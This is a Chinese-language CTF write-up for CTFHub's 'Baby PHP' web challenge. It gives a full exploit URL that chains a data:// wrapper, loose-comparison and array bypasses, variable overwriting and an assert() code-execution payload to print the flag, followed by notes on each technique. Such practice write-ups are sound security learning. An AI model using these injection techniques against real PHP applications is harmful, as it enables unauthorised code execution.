
---
layout: post
title: "CTFHub Writeup-Baby PHP"
date: 2026-09-16
categories: CTF
tags: [CTFHub, Web, 签到题]
---

# CTFHub Writeup - Baby PHP 

## 题目类型

WEB

## 题目描述

点击题目后，题目上会出现一行链接：

http://challenge-2023fdb5cd62f356.sandbox.ctfhub.com:10800/

## 解题过程

点开链接后分析并理解代码的意思

在搜索框中打入此链接：

http://challenge-35c68e07699bc08c.sandbox.ctfhub.com:10800/?msg=data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ&key1=1337e0&key2=1337%EF%BC%84aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&cc[]=1234&k1=2&hack=k1&bb=print_r($flag);//

回车，就能找到正确的flag了

## 笔记

这道题主要学习了：

1. PHP伪协议 data://
不用读本地文件，可以直接在url里往页面输入代码/文本，绕过文件包含的限制。

2. PHP弱类型比较
== 松散相等，数字和科学计数法字符串可以相等，比如1337和1337e0判为相等，不是严格全等===，用来绕过数字判断。

3. 变量覆盖漏洞
$$ 可变变量，get传参可以直接改写程序内部的变量，把程序原本的变量值直接改掉，绕过校验。

4. 数组绕过判断
有些PHP函数传入数组，会报错返回true，用来绕过逻辑判断。

5. assert() 代码执行
assert可以把字符串当成PHP代码运行，拿到执行权限，最终读取flag。
